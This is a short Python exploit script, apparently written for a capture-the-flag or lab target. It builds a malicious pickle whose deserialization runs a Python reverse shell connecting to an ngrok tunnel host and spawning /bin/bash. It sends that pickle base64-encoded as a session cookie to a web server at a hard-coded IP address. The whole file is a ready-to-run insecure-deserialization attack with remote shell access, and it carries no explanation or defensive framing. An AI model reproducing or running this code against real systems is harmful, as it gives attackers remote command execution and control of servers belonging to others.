#!/usr/bin/env python3
import pickle, os, base64
import requests

class P(object):
    def __reduce__(self):
        return (os.system,('''python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("0.tcp.ap.ngrok.io",13897));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' ''',))

def main():
    pickledPayload = base64.b64encode(pickle.dumps(P())).decode()
    print(f'[*] Payload: {pickledPayload}')

    URL = 'http://103.152.242.235:5000/home'
    cookie = {
        'session': pickledPayload
    }

    print('[*] Request result:')
    orderRequestResult = requests.get(URL, cookies=cookie)
    print(orderRequestResult.text)

if __name__ == '__main__':
    main()
